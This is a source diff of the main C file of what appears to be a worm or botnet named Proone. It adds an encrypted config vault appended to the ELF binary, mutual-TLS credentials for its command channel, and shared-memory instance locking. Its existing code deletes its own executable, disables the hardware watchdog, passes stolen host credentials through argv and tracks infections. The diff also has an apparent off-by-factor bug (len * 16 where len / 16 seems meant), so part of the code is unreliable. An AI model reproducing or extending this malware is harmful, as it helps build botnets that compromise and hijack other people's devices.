@@ -15,7 +15,9 @@
 #include <sys/mman.h>
 #include <sys/file.h>
 #include <sys/wait.h>
+#include <elf.h>
 
+#include "config.h"
 #include "proone.h"
 #include "protocol.h"
 #include "util_rt.h"
@@ -23,7 +25,6 @@
 #include "llist.h"
 // #include "htbt-worker.h"
 #include "mbedtls.h"
-#include "proone_conf/x509.h"
 
 
 struct prne_global prne_g;
@@ -39,9 +40,53 @@ static void alloc_workers (void) {
 		prne_init_worker(wkr_arr + i);
 	}
 
-	prne_g.resolv = prne_alloc_resolv(wkr_arr + 0, &prne_g.ssl.rnd);
-	prne_assert(prne_g.resolv != NULL);
-	wkr_cnt += 1;
+	{
+		prne_resolv_ns_pool_t pool4, pool6;
+
+		prne_resolv_init_ns_pool(&pool4);
+		prne_resolv_init_ns_pool(&pool6);
+
+		do {
+			size_t i, len, cnt;
+			const uint8_t *bin;
+
+			bin = prne_dvault_get_bin(PRNE_DATA_KEY_RESOLV_NS_IPV4, &len);
+			prne_dbgast(len != 0 && len % 16 == 0);
+			cnt = len * 16;
+
+			if (!prne_resolv_alloc_ns_pool(&pool4, cnt)) {
+				break;
+			}
+			for (i = 0; i < cnt; i += 1) {
+				memcpy(pool4.arr[i].addr.addr, bin + i * 16, 16);
+				pool4.arr[i].addr.ver = PRNE_IPV_4;
+				pool4.arr[i].port = 853;
+			}
+
+			bin = prne_dvault_get_bin(PRNE_DATA_KEY_RESOLV_NS_IPV6, &len);
+			prne_dbgast(len != 0 && len % 16 == 0);
+			cnt = len * 16;
+
+			if (!prne_resolv_alloc_ns_pool(&pool6, cnt)) {
+				break;
+			}
+			for (i = 0; i < cnt; i += 1) {
+				memcpy(pool6.arr[i].addr.addr, bin + i * 16, 16);
+				pool6.arr[i].addr.ver = PRNE_IPV_6;
+				pool6.arr[i].port = 853;
+			}
+			
+			prne_g.resolv = prne_alloc_resolv(wkr_arr + 0, &prne_g.ssl.rnd, pool4, pool6);
+			if (prne_g.resolv != NULL) {
+				wkr_cnt += 1;
+				pool4.ownership = false;
+				pool6.ownership = false;
+			}
+		} while (false);
+
+		prne_resolv_free_ns_pool(&pool4);
+		prne_resolv_free_ns_pool(&pool6);
+	}
 }
 
 static void free_workers (void) {
@@ -106,26 +151,6 @@ static int proone_main (void) {
 	return 0;
 }
 
-static bool ensure_single_instance (void) {
-	prne_g.lock_shm_fd = shm_open(
-		prne_dvault_unmask_entry_cstr(PRNE_DATA_KEY_PROC_LIM_SHM, NULL),
-		O_RDWR | O_CREAT | O_CLOEXEC,
-		0666);
-	prne_dvault_reset_dict();
-	if (prne_g.lock_shm_fd < 0) {
-		return true;
-	}
-
-	if (flock(prne_g.lock_shm_fd, LOCK_EX | LOCK_NB) < 0) {
-		prne_close(prne_g.lock_shm_fd);
-		prne_g.lock_shm_fd = -1;
-
-		return false;
-	}
-
-	return true;
-}
-
 static void delete_myself (const char *arg0) {
 #ifndef PRNE_DEBUG
 	static const char *proc_path = "/proc/self/exe";
@@ -168,118 +193,309 @@ static void disasble_watchdog (void) {
 #endif
 }
 
-static void read_host_credential (void) {
-	static const size_t buf_size = (1 + 2 + 255 * 2) * 4 / 3 + 2;
-	char *buf = (char*)prne_malloc(1, buf_size);
-	size_t len;
-
-	if (buf == NULL) {
-		return;
-	}
-
-	if (fgets(buf, buf_size, stdin) == NULL) {
-		goto END;
-	}
-	len = prne_str_shift_spaces(buf, strlen(buf));
-
-	if (len > 0) {
-		prne_dec_base64_mem(buf, len, &prne_g.host_cred_data, &prne_g.host_cred_size);
-	}
-
-END:
-	prne_free(buf);
-}
-
-static void setup_bin_archive (void) {
-	// TODO
-#if 0
-	prne_stdin_base64_rf_ctx_t rf_ctx;
-
-	prne_init_stdin_base64_rf_ctx(&rf_ctx);
-	prne_g.bin_ready = prne_index_bin_archive(&rf_ctx, prne_stdin_base64_rf, &prne_g.bin_archive).rc == PRNE_PACK_RC_OK;
-	prne_free_stdin_base64_rf_ctx(&rf_ctx);
-#endif
-}
-
 static void set_env (void) {
 	// environment set up function calls in here
 }
 
-static void load_ssl_conf (void) {
-	// Could save 1108 bytes if bundled and compressed
-	static const uint8_t CA_CRT[] = PRNE_X509_CA_CRT;
-	static const uint8_t S_CRT[] = PRNE_X509_S_CRT;
-	static const uint8_t S_KEY[] = PRNE_X509_S_KEY;
-	static const uint8_t DH[] = PRNE_X509_DH;
-	static const uint8_t C_CRT[] = PRNE_X509_C_CRT;
-	static const uint8_t C_KEY[] = PRNE_X509_C_KEY;
-	
-	if (mbedtls_x509_crt_parse(&prne_g.ssl.ca, CA_CRT, sizeof(CA_CRT)) == 0) {
-		prne_g.s_ssl.ready =
-			mbedtls_ssl_config_defaults(&prne_g.s_ssl.conf, MBEDTLS_SSL_IS_SERVER, MBEDTLS_SSL_TRANSPORT_STREAM, MBEDTLS_SSL_PRESET_DEFAULT) == 0 &&
-			mbedtls_x509_crt_parse(&prne_g.s_ssl.crt, S_CRT, sizeof(S_CRT)) == 0 &&
-			mbedtls_pk_parse_key(&prne_g.s_ssl.pk, S_KEY, sizeof(S_KEY), NULL, 0) == 0 &&
-			mbedtls_dhm_parse_dhm(&prne_g.s_ssl.dhm, DH, sizeof(DH)) == 0 &&
-			mbedtls_ssl_conf_own_cert(&prne_g.s_ssl.conf, &prne_g.s_ssl.crt, &prne_g.s_ssl.pk) == 0 &&
-			mbedtls_ssl_conf_dh_param_ctx(&prne_g.s_ssl.conf, &prne_g.s_ssl.dhm) == 0;
-		if (prne_g.s_ssl.ready) {
-			mbedtls_ssl_conf_ca_chain(&prne_g.s_ssl.conf, &prne_g.ssl.ca, NULL);
-			// mutual auth
-			mbedtls_ssl_conf_authmode(&prne_g.s_ssl.conf, MBEDTLS_SSL_VERIFY_REQUIRED);
-			// ignore expired cert (system wall clock might not be set)
-			mbedtls_ssl_conf_verify(&prne_g.s_ssl.conf, prne_mbedtls_x509_crt_verify_cb, NULL); 
-		}
+static void setup_dvault (void) {
+	prne_g.m_dvault = (uint8_t*)prne_malloc(1, prne_g.dvault_size);
+	memcpy(prne_g.m_dvault, prne_g.m_exec_dvault, prne_g.dvault_size);
 
-		prne_g.c_ssl.ready =
-			mbedtls_ssl_config_defaults(&prne_g.c_ssl.conf, MBEDTLS_SSL_IS_SERVER, MBEDTLS_SSL_TRANSPORT_STREAM, MBEDTLS_SSL_PRESET_DEFAULT) == 0 &&
-			mbedtls_x509_crt_parse(&prne_g.c_ssl.crt, C_CRT, sizeof(C_CRT)) == 0 &&
-			mbedtls_pk_parse_key(&prne_g.c_ssl.pk, C_KEY, sizeof(C_KEY), NULL, 0) == 0 &&
-			mbedtls_ssl_conf_own_cert(&prne_g.c_ssl.conf, &prne_g.c_ssl.crt, &prne_g.c_ssl.pk) == 0;
-		if (prne_g.c_ssl.ready) {
-			mbedtls_ssl_conf_ca_chain(&prne_g.c_ssl.conf, &prne_g.ssl.ca, NULL);
-			// mutual auth
-			mbedtls_ssl_conf_authmode(&prne_g.c_ssl.conf, MBEDTLS_SSL_VERIFY_REQUIRED);
-			// ignore expired cert (system wall clock might not be set)
-			mbedtls_ssl_conf_verify(&prne_g.c_ssl.conf, prne_mbedtls_x509_crt_verify_cb, NULL); 
-		}
-	}
+	prne_init_dvault(prne_g.m_dvault);
 }
 
-static void init_shared_global (void) {
-	// just die on error
-	static const size_t str_len = 1 + 30;
+static bool setup_binarch (const void *m) {
+	// TODO: Load bin arc
+	return false;
+}
+
+static void init_proone (const char *self) {
 	int fd;
-	char name[str_len];
+#if PRNE_HOST_WORDSIZE == 64
+	static const unsigned char EXPTD_CLASS = 2;
+#define ELF_EHDR_TYPE Elf64_Ehdr
+#elif PRNE_HOST_WORDSIZE == 32
+	static const unsigned char EXPTD_CLASS = 1;
+#define ELF_EHDR_TYPE Elf32_Ehdr
+#else
+	#error "FIXME!"
+#endif
+#if PRNE_HOST_ENDIAN == PRNE_ENDIAN_LITTLE
+	static const unsigned char EXPTD_DATA = 1;
+#elif PRNE_HOST_ENDIAN == PRNE_ENDIAN_BIG
+	static const unsigned char EXPTD_DATA = 2;
+#else
+	#error "FIXME!"
+#endif
+	ELF_EHDR_TYPE *elf;
+	uint_fast32_t dvault_ofs, binarch_ofs, binarch_size;
+	off_t file_size;
+
+	set_env();
+
+	fd = open(self, O_RDONLY);
+	prne_assert(fd >= 0);
+	file_size = lseek(fd, 0, SEEK_END);
+	prne_assert(file_size >= (off_t)sizeof(ELF_EHDR_TYPE));
+	prne_g.m_exec = (const uint8_t*)mmap(
+		NULL,
+		file_size,
+		PROT_READ,
+		MAP_SHARED,
+		fd,
+		0);
+	prne_close(fd);
+	prne_assert(prne_g.m_exec != MAP_FAILED);
+
+	// Use header
+	elf = (ELF_EHDR_TYPE*)prne_g.m_exec;
+	prne_assert(
+		elf->e_ident[EI_MAG0] == ELFMAG0 &&
+		elf->e_ident[EI_MAG1] == ELFMAG1 &&
+		elf->e_ident[EI_MAG2] == ELFMAG2 &&
+		elf->e_ident[EI_MAG3] == ELFMAG3);
+	prne_assert(elf->e_ident[EI_CLASS] == EXPTD_CLASS);
+	prne_assert(elf->e_ident[EI_DATA] == EXPTD_DATA);
+
+	prne_g.exec_size = elf->e_shoff + (elf->e_shentsize * elf->e_shnum);
+	prne_g.exec_size = prne_salign_next(prne_g.exec_size, PRNE_BIN_ALIGNMENT);
+	prne_massert(
+		prne_g.exec_size + 8 <= (size_t)file_size,
+		"No appendix!");
+
+	// Read sizes
+	prne_g.dvault_size =
+		(uint_fast16_t)prne_g.m_exec[prne_g.exec_size + 0] << 8 |
+		(uint_fast16_t)prne_g.m_exec[prne_g.exec_size + 1] << 0;
+	binarch_size = 
+		(uint_fast32_t)prne_g.m_exec[prne_g.exec_size + 4] << 24 |
+		(uint_fast32_t)prne_g.m_exec[prne_g.exec_size + 5] << 16 |
+		(uint_fast32_t)prne_g.m_exec[prne_g.exec_size + 6] << 8 |
+		(uint_fast32_t)prne_g.m_exec[prne_g.exec_size + 7] << 0;
+
+	dvault_ofs = prne_salign_next(
+		prne_g.exec_size + 8,
+		PRNE_BIN_ALIGNMENT);
+	binarch_ofs = prne_salign_next(
+		dvault_ofs + prne_g.dvault_size,
+		PRNE_BIN_ALIGNMENT);
+		
+	// Load dvault
+	prne_assert(dvault_ofs + prne_g.dvault_size <= (size_t)file_size);
+	prne_g.m_exec_dvault = prne_g.m_exec + dvault_ofs;
+	setup_dvault();
+
+	if (binarch_size > 0) {
+		prne_assert(binarch_ofs + binarch_size <= (size_t)file_size);
+		setup_binarch(prne_g.m_exec + binarch_ofs);
+	}
+	else {
+		prne_dbgpf("* This executable has no binary archive!\n");
+	}
+#undef ELF_EHDR_TYPE
+}
+
+static void deinit_proone (void) {
+	prne_deinit_dvault();
+	prne_free(prne_g.m_dvault);
+	prne_g.m_dvault = NULL;
+}
+
+static void load_ssl_conf (void) {
+#define BREAKIF_ERR(f) if (mret != 0) {\
+	prne_dbgpf("%s() returned %d\n", f, mret);\
+	break;\
+}
+	size_t dvlen = 0;
+	int mret;
+	const uint8_t *data;
+
+	do {
+		data = prne_dvault_get_bin(PRNE_DATA_KEY_X509_CA_CRT, &dvlen);
+		mret = mbedtls_x509_crt_parse(&prne_g.ssl.ca, data, dvlen);
+		BREAKIF_ERR("mbedtls_x509_crt_parse");
+
+		// Server stuff
+		mret = mbedtls_ssl_config_defaults(
+			&prne_g.s_ssl.conf,
+			MBEDTLS_SSL_IS_SERVER,
+			MBEDTLS_SSL_TRANSPORT_STREAM,
+			MBEDTLS_SSL_PRESET_DEFAULT);
+		BREAKIF_ERR("mbedtls_ssl_config_defaults");
+		data = prne_dvault_get_bin(PRNE_DATA_KEY_X509_S_CRT, &dvlen);
+		mret = mbedtls_x509_crt_parse(&prne_g.s_ssl.crt, data, dvlen);
+		BREAKIF_ERR("mbedtls_x509_crt_parse");
+		data = prne_dvault_get_bin(PRNE_DATA_KEY_X509_S_KEY, &dvlen);
+		mret = mbedtls_pk_parse_key(&prne_g.s_ssl.pk, data, dvlen, NULL, 0);
+		BREAKIF_ERR("mbedtls_pk_parse_key");
+		data = prne_dvault_get_bin(PRNE_DATA_KEY_X509_DH, &dvlen);
+		mret = mbedtls_dhm_parse_dhm(&prne_g.s_ssl.dhm, data, dvlen);
+		BREAKIF_ERR("mbedtls_dhm_parse_dhm");
+		mret = mbedtls_ssl_conf_own_cert(
+			&prne_g.s_ssl.conf,
+			&prne_g.s_ssl.crt,
+			&prne_g.s_ssl.pk);
+		BREAKIF_ERR("mbedtls_ssl_conf_own_cert");
+		mret = mbedtls_ssl_conf_dh_param_ctx(
+			&prne_g.s_ssl.conf,
+			&prne_g.s_ssl.dhm);
+		BREAKIF_ERR("mbedtls_ssl_conf_dh_param_ctx");
+		prne_g.s_ssl.ready = true;
+
+		// Client stuff
+		mret = mbedtls_ssl_config_defaults(
+			&prne_g.c_ssl.conf,
+			MBEDTLS_SSL_IS_SERVER,
+			MBEDTLS_SSL_TRANSPORT_STREAM,
+			MBEDTLS_SSL_PRESET_DEFAULT);
+		BREAKIF_ERR("mbedtls_ssl_config_defaults");
+		data = prne_dvault_get_bin(PRNE_DATA_KEY_X509_C_CRT, &dvlen);
+		mret = mbedtls_x509_crt_parse(&prne_g.c_ssl.crt, data, dvlen);
+		BREAKIF_ERR("mbedtls_x509_crt_parse");
+		data = prne_dvault_get_bin(PRNE_DATA_KEY_X509_C_KEY, &dvlen);
+		mret = mbedtls_pk_parse_key(&prne_g.c_ssl.pk, data, dvlen, NULL, 0);
+		BREAKIF_ERR("mbedtls_pk_parse_key");
+		mret = mbedtls_ssl_conf_own_cert(
+			&prne_g.c_ssl.conf,
+			&prne_g.c_ssl.crt,
+			&prne_g.c_ssl.pk);
+		BREAKIF_ERR("mbedtls_ssl_conf_own_cert");
+		prne_g.c_ssl.ready = true;
+	} while (false);
+	prne_dvault_reset();
+
+	// set mutual auth
+	// ignore expired cert (system wall clock might not be set)
+	if (prne_g.s_ssl.ready) {
+		mbedtls_ssl_conf_ca_chain(
+			&prne_g.s_ssl.conf,
+			&prne_g.ssl.ca, NULL);
+		mbedtls_ssl_conf_authmode(
+			&prne_g.s_ssl.conf,
+			MBEDTLS_SSL_VERIFY_REQUIRED);
+		mbedtls_ssl_conf_verify(
+			&prne_g.s_ssl.conf,
+			prne_mbedtls_x509_crt_verify_cb,
+			NULL); 
+	}
+	if (prne_g.c_ssl.ready) {
+		mbedtls_ssl_conf_ca_chain(
+			&prne_g.c_ssl.conf, 
+			&prne_g.ssl.ca, 
+			NULL);
+		mbedtls_ssl_conf_authmode(
+			&prne_g.c_ssl.conf, 
+			MBEDTLS_SSL_VERIFY_REQUIRED);
+		mbedtls_ssl_conf_verify(
+			&prne_g.c_ssl.conf, 
+			prne_mbedtls_x509_crt_verify_cb,
+			NULL); 
+	}
+#undef BREAKIF_ERR
+}
+
+static bool try_lock_file (const int fd) {
+	return flock(fd, LOCK_EX | LOCK_NB) == 0;
+}
+
+static bool format_shared_global (const int fd) {
+	uint8_t rev;
+
+	if (read(fd, &rev, 1) != 1) {
+		return false;
+	}
+
+	switch (rev) {
+	// Future format update code goes here
+	case 0:
+		if (lseek(fd, 0, SEEK_END) >= (off_t)sizeof(struct prne_shared_global)) {
+			return true;
+		}
+		break;
+	}
+
+	return false;
+}
+
+static bool init_shared_global (void) {
+	int fd;
+	const char *fname;
+	bool ret = true;
 
 	/* TODO
-	* 1. Try anonymous mmap()
-	* 2. Try opening /dev/zero
 	* 3. Try creating and opening /tmp/...
 	* 4. Try creating and opening random file in current wd
 	* 5. ... just don't use shared memory if all of these fail
 	*/
-	name[0] = '/';
-	name[str_len] = 0;
-	prne_rnd_anum_str(&prne_g.ssl.rnd, name + 1, str_len - 1);
-	
-	fd = shm_open(name, O_RDWR | O_CREAT | O_TRUNC, 0000);
-	if (fd < 0) {
-		abort();
-	}
-	shm_unlink(name);
 
-	if (ftruncate(fd, sizeof(struct prne_shared_global)) < 0) {
-		abort();
+	fname = prne_dvault_get_cstr(PRNE_DATA_KEY_PROC_LIM_SHM, NULL);
+	do {
+		fd = shm_open(fname, O_RDWR, 0600);		
+		if (fd >= 0) {
+			if (!try_lock_file(fd)) {
+				ret = false;
+				goto END;
+			}
+			if (format_shared_global(fd)) {
+				break;
+			}
+			else {
+				prne_close(fd);
+				fd = -1;
+			}
+		}
+
+		fd = shm_open(fname, O_RDWR | O_CREAT | O_TRUNC, 0600);
+		if (fd >= 0) {
+			struct prne_shared_global skel;
+
+			if (!try_lock_file(fd)) {
+				ret = false;
+				goto END;
+			}
+
+			memzero(&skel, sizeof(skel));
+			// Future code for new shared_global format goes here
+			skel.rev = 0;
+
+			if (write(fd, &skel, sizeof(skel)) != sizeof(skel)) {
+				goto END;
+			}
+		}
+		else {
+			goto END;
+		}
+	} while (false);
+
+	prne_s_g = (struct prne_shared_global*)mmap(
+		NULL,
+		sizeof(struct prne_shared_global),
+		PROT_READ | PROT_WRITE,
+		MAP_SHARED,
+		fd,
+		0);
+	if (prne_s_g == MAP_FAILED) {
+		prne_s_g = NULL;
+		prne_dbgperr("* Failed to initialise shared global");
 	}
-	prne_s_g = (struct prne_shared_global*)mmap(NULL, sizeof(struct prne_shared_global), PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
-	if (prne_s_g == NULL) {
-		abort();
+	else {
+		prne_s_g->ny_bin_name[0] = 0;
 	}
+
+END:
 	prne_close(fd);
+	prne_dvault_reset();
 
-	prne_s_g->bne_cnt = 0;
-	prne_s_g->infect_cnt = 0;
-	prne_s_g->ny_bin_name[0] = 0;
+	return ret;
+}
+
+static void deinit_shared_global (void) {
+	if (prne_s_g != NULL) {
+		munmap(prne_s_g, sizeof(struct prne_shared_global));
+		prne_s_g = NULL;
+	}
+	prne_close(prne_g.shm_fd);
+	prne_g.shm_fd = -1;
 }
 
 static void init_ids (void) {
@@ -309,12 +525,35 @@ static void init_ids (void) {
 	prne_close(fd);
 }
 
+static void set_host_credential (const char *str) {
+	if (prne_s_g == NULL) {
+		return;
+	}
+
+	strncpy(prne_s_g->host_cred_data, str, sizeof(prne_s_g->host_cred_data) - 1);
+}
+
 static void run_ny_bin (void) {
+	sigset_t old_ss;
+	bool has_ss;
+	
+	// Clean the house for the new image.
+	// Free any resource that survives exec() call.
+	deinit_shared_global();
+	has_ss = sigprocmask(SIG_UNBLOCK, &ss_all, &old_ss) == 0;
+
 	// TODO
+	
+	// exec() failed
+	// Restore previous condifion
+	if (has_ss) {
+		sigprocmask(SIG_BLOCK, &old_ss, NULL);
+	}
+	init_shared_global();
 }
 
 
-int main (const int argc, char **args) {
+int main (const int argc, const char **args) {
 	static int exit_code = 0;
 	static bool loop = true;
 
@@ -326,14 +565,11 @@ int main (const int argc, char **args) {
 	sigaddset(&ss_all, SIGTERM);
 	sigaddset(&ss_all, SIGCHLD);
 
-	prne_g.host_cred_data = NULL;
-	prne_g.host_cred_size = 0;
 	prne_g.parent_start = prne_gettime(CLOCK_MONOTONIC);
-	prne_g.run_cnt = 0;
 	prne_g.resolv = NULL;
 	prne_g.parent_pid = getpid();
 	prne_g.child_pid = 0;
-	prne_g.lock_shm_fd = -1;
+	prne_g.shm_fd = -1;
 	prne_g.bin_ready = false;
 	prne_g.is_child = false;
 	prne_init_bin_archive(&prne_g.bin_archive);
@@ -350,27 +586,25 @@ int main (const int argc, char **args) {
 	mbedtls_pk_init(&prne_g.c_ssl.pk);
 	prne_g.c_ssl.ready = false;
 
-	// inits that need no outside resources
-	prne_init_dvault();
-	set_env();
+	init_proone(args[0]);
 
 	/* inits that need outside resources. IN THIS ORDER! */
 	load_ssl_conf();
 	seed_ssl_rnd(NULL, 0);
 	init_ids();
-	init_shared_global();
-	delete_myself(args[0]);
-	disasble_watchdog();
-
-	if (!ensure_single_instance()) {
-		prne_dbgpf("*** ensure_single_instance() returned false.");
+	if (!init_shared_global()) {
+		prne_dbgpf("*** Another instance detected.\n");
 		exit_code = 1;
 		goto END;
 	}
+	delete_myself(args[0]);
+	disasble_watchdog();
 
-	setup_bin_archive();
+
 	// load data from stdin
-	read_host_credential();
+	if (argc > 1) {
+		set_host_credential(args[1]);
+	}
 	
 	// done with the terminal
 	prne_close(STDIN_FILENO);
@@ -385,16 +619,12 @@ int main (const int argc, char **args) {
 	while (loop) {
 		prne_g.child_pid = fork();
 
-		if (prne_g.child_pid >= 0) {
-			prne_g.run_cnt += 1;
-		}
-
 		if (prne_g.child_pid > 0) {
 			static int status;
 			static bool has_ny_bin;
 			static int caught_signal = 0;
 
-			status = 0; // FIXME: libc bug?
+			status = 0; // TODO FIXME: libc bug?
 
 			do {
 				prne_assert(sigwait(&ss_all, &caught_signal) == 0);
@@ -415,6 +645,10 @@ int main (const int argc, char **args) {
 
 			has_ny_bin = strlen(prne_s_g->ny_bin_name) > 0;
 
+			if (!(WIFEXITED(status) && WEXITSTATUS(status) == 0)) {
+				prne_s_g->crash_cnt += 1;
+			}
+
 			if (WIFEXITED(status)) {
 				prne_dbgpf("* child process %d exited with code %d!\n", prne_g.child_pid, WEXITSTATUS(status));
 				if (WEXITSTATUS(status) == 0) {
@@ -432,15 +666,15 @@ int main (const int argc, char **args) {
 			}
 
 			if (has_ny_bin) {
-				shm_unlink(prne_s_g->ny_bin_name);
-				memzero(prne_s_g->ny_bin_name, sizeof(prne_s_g->ny_bin_name));
+				unlink(prne_s_g->ny_bin_name);
+				prne_s_g->ny_bin_name[0] = 0;
 			}
 
 			sleep(1);
 		}
 		else {
-			prne_close(prne_g.lock_shm_fd);
-			prne_g.lock_shm_fd = -1;
+			prne_close(prne_g.shm_fd);
+			prne_g.shm_fd = -1;
 			prne_g.is_child = true;
 			prne_g.child_start = prne_gettime(CLOCK_MONOTONIC);
 		
@@ -467,18 +701,8 @@ END:
 	mbedtls_ctr_drbg_free(&prne_g.ssl.rnd);
 	mbedtls_entropy_free(&prne_g.ssl.entpy);
 
-	prne_free(prne_g.host_cred_data);
-	prne_g.host_cred_data = NULL;
-	prne_g.host_cred_size = 0;
-
-	if (prne_g.lock_shm_fd >= 0) {
-		shm_unlink(prne_dvault_unmask_entry_cstr(PRNE_DATA_KEY_PROC_LIM_SHM, NULL));
-		prne_dvault_reset_dict();
-		prne_close(prne_g.lock_shm_fd);
-		prne_g.lock_shm_fd = -1;
-	}
-
-	prne_deinit_dvault();
+	deinit_shared_global();
+	deinit_proone();
 
 	return exit_code;
 }
